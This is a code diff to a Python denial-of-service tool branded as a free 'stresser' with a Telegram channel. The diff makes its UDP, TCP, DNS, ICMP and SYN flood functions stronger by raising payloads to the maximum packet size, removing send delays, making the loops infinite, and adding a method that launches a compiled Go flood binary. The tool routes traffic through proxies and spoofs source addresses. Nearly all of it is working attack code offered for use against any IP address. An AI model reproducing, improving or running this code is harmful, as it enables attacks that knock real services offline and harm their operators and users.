@@ -729,19 +729,17 @@ def post(event, proxy_type):
 
 def udpflood(event, proxy_type, target_ip, target_port):
     global proxies
-    # Increased payload variety and size
+    # Increased payload size to 64 KB for maximum throughput
     payloads = [
-        generate_random_payload(1500), # Standard Ethernet MTU size
-        generate_random_payload(4096),
-        b"FLOOD" * 1000,
+        generate_random_payload(65507),  # Max UDP packet size
+        generate_random_payload(32768),  # Half max for variety
+        b"FLOOD" * 8192,  # 40 KB
     ]
     event.wait()
-    while event.is_set(): # Keep sending while the event is set
+    while event.is_set():
         s = None
         try:
             proxy = Choice(proxies)
-            # UDP sockets don't need a persistent connection in the same way TCP does
-            # We can create and send from sockets more freely
             s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
             proxy_ip, proxy_port = proxy.split(":")
             if proxy_type == 4:
@@ -750,29 +748,24 @@ def udpflood(event, proxy_type, target_ip, target_port):
                 s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
-            s.settimeout(2)
+            s.settimeout(1)  # Reduced timeout for faster retries
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.bind(("", Intn(1024, 65535))) # Bind to a random source port
-
-            # Send continuously
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)  # Added for better concurrency
+            s.bind(("", Intn(1024, 65535)))
             while event.is_set():
                 payload = Choice(payloads)
                 s.sendto(payload, (target_ip, target_port))
-                # Add a small delay
-                time.sleep(0.005) # Slightly faster for UDP as it's connectionless
-
+                # Removed sleep to maximize send rate
         except:
-            # If an error occurs, close the socket and continue
             if s:
                 s.close()
-            time.sleep(0.1) # Small delay before trying again
 
 def tcpflood(event, proxy_type, target_ip, target_port):
     global proxies
     payloads = [
-        generate_random_payload(1024),
-        generate_random_payload(4096),
-        b"SYN" * 1000,
+        generate_random_payload(65535),  # Max TCP payload size
+        generate_random_payload(32768),
+        b"SYN" * 16384,  # 48 KB
     ]
     event.wait()
     while True:
@@ -781,14 +774,15 @@ def tcpflood(event, proxy_type, target_ip, target_port):
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle's algorithm
             s.connect((target_ip, target_port))
-            for _ in range(1000):
+            while True:
                 payload = Choice(payloads)
                 s.send(payload)
-                if random.random() < 0.1:
-                    s.close()
-                    s = setup_socket(proxy_type, proxy)
-                    s.connect((target_ip, target_port))
+                # Removed sleep, rely on TCP flow control
+                if random.random() < 0.05:  # Reduced reconnection rate
+                    break
             s.close()
         except:
             if s:
@@ -797,9 +791,9 @@ def tcpflood(event, proxy_type, target_ip, target_port):
 def dns(event, proxy_type, target_ip, target_port):
     global proxies
     dns_queries = [
-        b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x01\x00\x01",
-        b"\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x10\x00\x01",
-        b"\x00\x03\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(f"test{Intn(1,1000)}.com".encode()) + b"\x00\x00\x01\x00\x01",
+        b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x01\x00\x01" + generate_random_payload(65400),
+        b"\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x10\x00\x01" + generate_random_payload(65400),
+        b"\x00\x03\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(f"test{Intn(1,1000)}.com".encode()) + b"\x00\x00\x01\x00\x01" + generate_random_payload(65400),
     ]
     event.wait()
     while True:
@@ -814,12 +808,13 @@ def dns(event, proxy_type, target_ip, target_port):
                 s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
-            s.settimeout(2)
-            for _ in range(1000):
+            s.settimeout(1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            while True:
                 query = Choice(dns_queries)
                 s.sendto(query, (target_ip, target_port if target_port else 53))
                 s.bind(("", Intn(1024, 65535)))
-            s.close()
         except:
             if s:
                 s.close()
@@ -988,16 +983,14 @@ def tls(event, proxy_type):
 
 def udp_kill(event, proxy_type, target_ip, target_port):
     global proxies
-    # Increased payload variety and size
     payloads = [
-        generate_random_payload(2048),
-        generate_random_payload(4096),
-        generate_random_payload(8192),
-        b"FUCKYOU" * 1000 + b"ATTACK", # Using a swear word from the list and more data
+        generate_random_payload(65507),
+        generate_random_payload(32768),
+        b"FUCKYOU" * 8192 + b"ATTACK",  # 48 KB
     ]
-    spoofed_sources = [spoof_source_ip() for _ in range(100)] # Increased spoofed IPs
+    spoofed_sources = [spoof_source_ip() for _ in range(100)]
     event.wait()
-    while event.is_set(): # Keep sending while the event is set
+    while event.is_set():
         s = None
         try:
             proxy = Choice(proxies)
@@ -1010,22 +1003,17 @@ def udp_kill(event, proxy_type, target_ip, target_port):
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) # Keep broadcast flag
-            s.settimeout(2)
-
-            # Send continuously
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            s.settimeout(1)
             while event.is_set():
                 payload = Choice(payloads)
                 source_ip = Choice(spoofed_sources)
-                 # Bind to spoofed source IP and random port before sending
                 s.bind((source_ip, Intn(1024, 65535)))
                 s.sendto(payload, (target_ip, target_port))
-                time.sleep(0.005) # Small delay
-
         except:
             if s:
                 s.close()
-            time.sleep(0.1) # Small delay before trying again
 
 def ovh(event, proxy_type):
     global proxies
@@ -1178,9 +1166,9 @@ def api_killer(event, proxy_type):
 def icmp_blast(event, proxy_type, target_ip, target_port):
     global proxies
     payloads = [
-        generate_random_payload(64),
-        generate_random_payload(128),
-        generate_random_payload(256),
+        generate_random_payload(1472),  # Max ICMP payload size (1500 - 28 bytes header)
+        generate_random_payload(736),
+        generate_random_payload(368),
     ]
     spoofed_sources = [spoof_source_ip() for _ in range(100)]
     event.wait()
@@ -1197,8 +1185,9 @@ def icmp_blast(event, proxy_type, target_ip, target_port):
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.settimeout(2)
-            for _ in range(2000):
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            s.settimeout(1)
+            while True:
                 payload = Choice(payloads)
                 source_ip = Choice(spoofed_sources)
                 icmp_packet = (
@@ -1209,7 +1198,6 @@ def icmp_blast(event, proxy_type, target_ip, target_port):
                 )
                 s.sendto(icmp_packet, (target_ip, 0))
                 s.bind((source_ip, Intn(1024, 65535)))
-            s.close()
         except:
             if s:
                 s.close()
@@ -1224,12 +1212,13 @@ def syn_strike(event, proxy_type, target_ip, target_port):
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            for _ in range(2000):
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            while True:
                 source_ip = Choice(spoofed_sources)
                 s.bind((source_ip, Intn(1024, 65535)))
                 s.connect((target_ip, target_port))
-                s.send(b"\x00" * 20)
-            s.close()
+                s.send(b"\x00" * 65535)  # Max payload size
         except:
             if s:
                 s.close()
@@ -1423,10 +1412,10 @@ def main():
 {Colorate.Horizontal(Colors.cyan_to_blue, "                ╩ ╩╚═╝╩═╝╩    ")}
 {white}       ⏾⋆.˚ 𝓑𝓮𝓼𝓽 𝓯𝓻𝓮𝓮 𝓭𝓭𝓸𝓼 𝓽𝓸𝓸𝓵   ⏾⋆.˚
 {Colorate.Horizontal(Colors.cyan_to_blue, "     ═╦══════════════════════════════╦═")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] secret ➤ Exit        {Colorate.Horizontal(Colors.cyan_to_blue, "    ║")} 
-{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] help ➤ Show help message {Colorate.Horizontal(Colors.cyan_to_blue, "║")} 
-{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] methods ➤ List methods   {Colorate.Horizontal(Colors.cyan_to_blue, "║")} 
-{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] menu ➤ Show the menu     {Colorate.Horizontal(Colors.cyan_to_blue, "║")} 
+{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] secret ➤ Exit        {Colorate.Horizontal(Colors.cyan_to_blue, "    ║")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] help ➤ Show help message {Colorate.Horizontal(Colors.cyan_to_blue, "║")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] methods ➤ List methods   {Colorate.Horizontal(Colors.cyan_to_blue, "║")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "      ║")} {white}[●] menu ➤ Show the menu     {Colorate.Horizontal(Colors.cyan_to_blue, "║")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "     ═╩══════════════════════════════╩═")}
 """)
 
@@ -1449,7 +1438,7 @@ def main():
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {blue(" 𝓦𝓮𝓵𝓬𝓸𝓶𝓮")} {pink("𝓽𝓸")} {pink("𝓛𝓾𝓷𝓪𝓻")} !  {cyan_to_blue("║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 udpflood.. ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║                      ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 tcpflood.. ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║                      ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 dns....... ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
-{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink(" Methods Working:")}    {cyan_to_blue("║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 udp-kill.. ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
+{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink(" Methods Working:")}    {cyan_to_blue("║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 out....... ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [L7]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 icmp-blast ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [L4]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".l4 syn-strike ")}{cyan_to_pink("<ip> <threads> <time> <port>")}        {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")}  {gold_to_white("  [L2]")} {cyan_to_pink("● online   ")}{cyan_to_blue("  ║")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
@@ -1461,7 +1450,7 @@ def main():
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink(" Telegram Channel:")}  {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".h2 starxbypass")}{cyan_to_pink("<link> <threads> <time> <port>")}      {cyan_to_blue("‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_white(" LunarSTRESS.t.me")}   {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("╠══════════════════════╣")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[GAME]                                                 ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
-{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink("  Socials: ₊⁺☀︎₊⁺")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".game game-crash ")}{cyan_to_pink("<ip> <threads> <duration> <port>")} {cyan_to_blue(" ‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
+{cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {cyan_to_pink("  Socials: ₊⁺☀︎₊⁺")}   {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".game game-crash ")}{cyan_to_pink("<ip> <threads> <duration> <port>")} {cyan_to_blue(" ‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {gold_to_white("  TT: @neonworid")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[●]")} {cyan_to_pink(".game lobby-flood")}{cyan_to_pink("<ip> <threads> <duration> <port>")} {cyan_to_blue(" ‖")} {gray("PERMISSION:")} {green_to_white("[DEFAULT]")} {cyan_to_blue("‖")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {gold_to_white("  TG: @neonworid")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("╠════════════════════════════════════════════════════════╬═══════════════════════╣")}
 {cyan_to_blue("‖")} {cyan_to_pink("░")} {cyan_to_blue("║")} {gold_to_white("  TGC: @cursenet")}    {cyan_to_blue(" ║")} {cyan_to_pink("░")} {cyan_to_blue("‖")} {gold_to_white("[MC]                                                   ")}{cyan_to_blue("‖")} {gold_to_white("                      ")}{cyan_to_blue("‖")}
@@ -1476,7 +1465,7 @@ def main():
 
         elif command == "plsletmego":
             exit()
-        
+
         elif command == "menu":
             bannerm2()
 
@@ -1512,24 +1501,59 @@ def main():
         elif command.startswith(".l4"):
             try:
                 args = command.split()
-                if len(args) < 5:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l4 <method> <ip> <threads> <duration> [port]"))
+                if len(args) < 6:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l4 <method> <ip> <threads> <time> <port>"))
                     continue
                 method = args[1].lower()
                 ip = args[2]
                 threads = int(args[3])
-                duration = int(args[4])
-                port = int(args[5]) if len(args) > 5 else None
+                time_duration = int(args[4])
+                port = int(args[5])
                 proxy_type = 5  # Default to SOCKS5
-                if method not in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
+                if method not in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike", "out"]:
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L4 method. Use 'methods' to list available options."))
                     continue
-                if threads < 1 or duration < 1:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
+                if threads < 1 or time_duration < 1:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and time must be positive integers."))
                     continue
-                Launch(method, ip, threads, duration, proxy_type, port)
+                if method == "out":
+                    import subprocess
+                    import os
+                    clearcs()
+                    # Print attack summary
+                    print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "             ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}
+{white}  ⋆.˚ ☾ .⭒˚ 𝓑𝓮𝓼𝓽 𝓬𝓱𝓮𝓪𝓹 𝓼𝓽𝓻𝓮𝓼𝓼𝓮𝓻 ⋆.˚ ☾ .⭒˚
+{Colorate.Horizontal(Colors.cyan_to_blue, "╔═══════════════════════════════════════════╗")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "║")} {white}𝓐𝓽𝓽𝓪𝓬𝓴 𝓢𝓾𝓶𝓶𝓪𝓻𝔂 {Colorate.Horizontal(Colors.cyan_to_blue, '                           ║')}
+{Colorate.Horizontal(Colors.cyan_to_blue, '╠═══╦═══════════════════════════════════════╣')}
+{Colorate.Horizontal(Colors.cyan_to_blue, '║ ● ║')} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, '    ➤')}  {ip.ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, '║ ● ║')} {white}ᴍᴇᴛʜᴏᴅ {Colorate.Horizontal(Colors.cyan_to_blue, '    ➤')}  {'out'.ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, '║ ● ║')} {white}ᴘᴏʀᴛ {Colorate.Horizontal(Colors.cyan_to_blue, '      ➤')}  {str(port).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, '║ ● ║')} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, '      ➤')}  {str(time_duration).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, '║ ● ║')} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, '    ➤')}  {str(threads).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, '╠═══╬═══════════════════════════════════════╣')}
+{Colorate.Horizontal(Colors.cyan_to_blue, '║ ● ║')} {white}ᴀᴄᴄᴇꜱꜱ     {Colorate.Horizontal(Colors.cyan_to_blue, '➤')}  VIP
+{Colorate.Horizontal(Colors.cyan_to_blue, '╠═══╬═══════════════════════════════════════╣')}
+{Colorate.Horizontal(Colors.cyan_to_blue, '║ ● ║')} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, '➤')}  https://check-host.net/check-http?host={ip}
+{Colorate.Horizontal(Colors.cyan_to_blue, '╚═══╩═══════════════════════════════════════╝')}""")
+                    # Set environment variables for the Go binary
+                    os.environ["target"] = ip
+                    os.environ["port"] = str(port)
+                    os.environ["threads"] = str(threads)
+                    os.environ["duration"] = str(time_duration)
+                    # Run the Go binary
+                    try:
+                        subprocess.run(["./tcpflood"], check=True)
+                    except subprocess.CalledProcessError:
+                        print(Colorate.Horizontal(Colors.cyan_to_blue, "> Failed to execute tcpflood. Ensure the Go binary is compiled and in the current directory."))
+                    except FileNotFoundError:
+                        print(Colorate.Horizontal(Colors.cyan_to_blue, "> tcpflood binary not found. Compile tcpflood.go with 'go build tcpflood.go' first."))
+                else:
+                    Launch(method, ip, threads, time_duration, proxy_type, port)
             except (ValueError, IndexError):
-                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l4 <method> <ip> <threads> <duration> [port]"))
+                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l4 <method> <ip> <threads> <time> <port>"))
 
         elif command.startswith(".game"):
             try:
